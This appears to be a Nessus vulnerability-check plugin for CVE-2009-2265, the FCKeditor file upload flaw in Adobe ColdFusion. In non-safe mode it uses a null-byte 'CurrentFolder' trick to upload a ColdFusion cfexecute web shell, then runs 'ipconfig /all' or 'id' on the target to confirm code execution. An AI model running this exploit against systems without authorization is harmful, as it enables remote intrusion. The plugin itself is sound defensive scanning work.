#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if (description)
{
  script_id(39790);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2009-2265");
  script_bugtraq_id(31812);
  script_xref(name:"OSVDB", value:"55820");
  script_xref(name:"Secunia", value:"35747");

  script_name(english:"Adobe ColdFusion FCKeditor 'CurrentFolder' File Upload");
  script_summary(english:"Tries to use upload a file with ColdFusion code using FCKeditor");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a application that is affected by an\n",
      "arbitrary file upload vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The version of Adobe ColdFusion installed on the remote host is\n",
      "affected by an arbitrary file upload vulnerability.  The installed\n",
      "version ships with a vulnerable version of an open source HTML text\n",
      "editor FCKeditor that fails to properly sanitize input passed to\n",
      "'CurrentFolder' parameter of the 'upload.cfm' script located under\n",
      "'/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm'. \n",
      "\n",
      "An attacker may be able to leverage this issue to upload arbitrary\n",
      "files and execute commands on the remote system subject to the\n",
      "privileges of the web server user id."
    )
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.ocert.org/advisories/ocert-2009-007.html"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.adobe.com/support/security/bulletins/apsb09-09.html"
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Upgrade to version 8.0.1 if necessary and apply the patch referenced\n",
      "in the vendor advisory above."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/07/03"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/07/08"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/07/14"
  );
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

# key = command, value = arguments
cmds = make_array();
cmd_desc = make_array();
cmd_pats = make_array();
os = get_kb_item("Host/OS");
os = 'Windows';

# decides which commands to run based on OS

# Windows (or unknown)
if (isnull(os) || 'Windows' >< os)
{
  cmds['cmd'] = '/c ipconfig /all';
  cmd_desc['cmd'] = 'ipconfig /all';
  cmd_pats['cmd'] = 'Windows IP Configuration';
}

# *nix (or unknown)
if (isnull(os) || 'Windows' >!< os)
{
  cmds['sh'] = '-c id';
  cmd_desc['sh'] = 'id';
  cmd_pats['sh'] = 'uid=[0-9]+.*gid=[0-9]+.*';
}

dir = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm";

folder_name = str_replace(
    find:".nasl", 
    replace:"-"+unixtime()+".cfm", 
    string:SCRIPT_NAME
  );

if(safe_checks())
{
  url = string(
    dir, "/upload.cfm?",
    "Command=FileUpload&",
    "Type=File&",
    "CurrentFolder=/", folder_name, "%0d"
  );
 
  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(0);

  # If it does and is not disabled...
  if (
    "OnUploadCompleted" >< res[2] && 
    "file uploader is disabled" >!< res[2]
  )
  {
    # Try to upload a file.
    bound = "nessus";
    boundary = string("--", bound);

    postdata = string(
      boundary, "\r\n", 
      # nb: the filename specified here is irrelevant.
      'content-disposition: form-data; name="newfile"; filename="nessus.txt"\r\n',
      'content-type: text/plain\r\n',
      '\r\n',
      '<!-- test script created by ', SCRIPT_NAME, '. -->\r\n',
      boundary, "--", "\r\n"
    );
     req = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(
                        "Content-Type", "multipart/form-data; boundary="+bound
        ),
        data        : postdata
      );

    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);
      
    if("An exception occurred when performing a file operation copy" >< res[2] &&
       string(folder_name,"\\r") >< res[2])
    {
      report = string(
        "\n",
        "The remote ColdFusion install responded with the following error, while trying to upload a file : ",
        res[2],"\n\n",
        "Note that Nessus reported this issue only based on the error message because \n",
        "safe checks were enabled for this scan.\n"
      );
      security_hole(port:port, extra:report);
    }
  }
}
else
{
  url = string(
    dir, "/upload.cfm?",
    "Command=FileUpload&",
    "Type=File&",
    "CurrentFolder=/", folder_name, "%00"
  );
 
  res = http_send_recv3(port:port, method:"GET", item:url);
  if (isnull(res)) exit(0);

  # If it does and is not disabled...
  if (
    "OnUploadCompleted" >< res[2] && 
    "file uploader is disabled" >!< res[2]
  )
  {
    # Try to upload a file to run a command.
    bound = "nessus";
    boundary = string("--", bound);
    timeout = get_read_timeout();

    foreach cmd (keys(cmds))
    {
      postdata = string(
        boundary, "\r\n", 
        # nb: the filename specified here is irrelevant.
        'content-disposition: form-data; name="newfile"; filename="nessus.txt"\r\n',
        'content-type: text/plain\r\n',
        '\r\n',
        # nb: this script executes a command, stores the output in a variable,
        #     and returns it to the user.
        '<cfsetting enablecfoutputonly="yes" showdebugoutput="no">\r\n',
        '\r\n',
        '<!-- test script created by ', SCRIPT_NAME, '. -->\r\n',
        '\r\n',
        '<cfexecute name="', cmd, '" arguments="', cmds[cmd], '" timeout="', timeout, '" variable="nessus"/>\r\n',
        '<cfoutput>#nessus#</cfoutput>\r\n',
  
        boundary, "--", "\r\n"
      );
       req = http_mk_post_req(
          port        : port,
          version     : 11, 
          item        : url, 
          add_headers : make_array(
                          "Content-Type", "multipart/form-data; boundary="+bound
          ),
          data        : postdata
        );
  
      res = http_send_recv_req(port:port, req:req);
      if (isnull(res)) exit(0);
  
      # Figure out the location of the script to request for code execution
      pat = string('OnUploadCompleted\\( *0, *"([^"]+/', folder_name, ')');
      foreach line (split(res[2], keep:FALSE))
      {
        matches = eregmatch(pattern:pat, string:line);
        if (matches) url2 = matches[1];
      }
      if (isnull(url2)) exit(0);
  
      # Now try to execute the script.
      res = http_send_recv3(port:port, method:"GET", item:url2);
      if (isnull(res)) exit(0);

      if(egrep(pattern:cmd_pats[cmd], string:res[2]))
      { 
        if (report_verbosity > 0)
        {
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd_desc[cmd], "' on the remote host, which\n",
            "produced the following output :\n",
            "\n",
            res[2]
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);

        exit (0);
      }
    }
  }
}
